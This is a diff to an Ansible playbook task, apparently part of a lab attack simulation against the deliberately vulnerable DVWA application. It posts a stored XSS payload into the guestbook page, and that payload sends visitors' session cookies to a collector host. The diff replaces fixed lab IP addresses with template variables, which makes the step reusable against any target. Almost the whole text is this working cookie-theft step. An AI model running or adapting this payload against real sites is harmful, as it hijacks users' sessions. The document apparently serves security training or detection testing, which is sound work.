@@ -1,6 +1,7 @@
 ---
 - name: Initial Access - Insert stored XSS payload into vulnerable page
   shell: |
-    curl -X POST "http://192.168.254.129/DVWA/vulnerabilities/xss_s/" \
-    -d "txtName=Attacker&mtxMessage=<script>window.location='http://192.168.254.131:8080/?c='+document.cookie</script>&btnSign=Sign Guestbook" \
+    curl -X POST "http://{{ web_victim_ip }}/DVWA/vulnerabilities/xss_s/" \
+    -d "txtName=Attacker&mtxMessage=<script>window.location='http://{{ collector_ip }}:8080/?c='+document.cookie</script>&btnSign=Sign Guestbook" \
     --cookie "security=low; PHPSESSID=dummy"
+  failed_when: false
